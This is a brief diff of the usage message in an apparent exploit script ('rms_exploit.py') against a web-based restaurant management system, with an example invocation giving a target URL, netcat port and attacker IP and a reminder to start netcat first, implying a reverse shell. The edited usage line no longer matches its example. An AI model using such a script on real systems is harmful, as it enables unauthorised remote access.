@@ -17,7 +17,7 @@ print("""
 
 
 print("""
-[!]Usage python3 exploit_file.py target_url netcat_port host_ip;
+[!]Usage python3 exploit_file.py target_url 
 python3 rms_exploit.py http://xxx.com/rms/ 1234 10.10.10.10
 [!]Don't forget to start netcat before running the script!
 """)
